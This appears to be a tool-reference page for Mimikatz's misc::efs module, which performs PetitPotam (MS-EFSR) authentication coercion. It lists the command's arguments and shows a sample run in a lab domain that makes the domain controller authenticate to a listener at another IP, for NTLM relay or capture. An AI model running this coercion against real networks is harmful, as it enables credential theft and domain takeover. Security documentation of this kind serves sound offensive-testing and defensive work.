# efs

The `misc::efs` is the Mimikatz's implementation of the [MS-EFSR abuse (PetitPotam)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr), an authentication coercion technique. It has the following command line arguments:

* `/authuser`: the [User Principal Name](https://kb.iu.edu/d/atzp) (UPN). By default it uses the current user's token
* `/authpassword`: the password of the user.
* `/noauth`: use null session
* `/endpoint`: the RPC endpoint. By default is uses `\pipe\lsarpc`
* `/server` or `/target`: the target server
* `/connect` or `/callback`: the unconstrained delegation server, or other host with Responder, etc.

```
mimikatz # misc::efs /server:dc.hacklab.local /connect:192.168.0.18 /noauth
[auth ] None
[ rpc ] Endpoint: \pipe\lsarpc
[trans] Disconnect eventual IPC: OK
[trans] Connect to IPC: OK
[ rpc ] Resolve Endpoint: OK

Remote server reported bad network path! (OK)
> Server (dc.hacklab.local) may have tried to authenticate (to: 192.168.0.18)

[trans] Disconnect IPC: OK
```

For more information on how to exploit this, see The Hacker Recipes. It can be used to NTLM relay attacks, NTLM capture, etc.

{% embed url="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr" %}
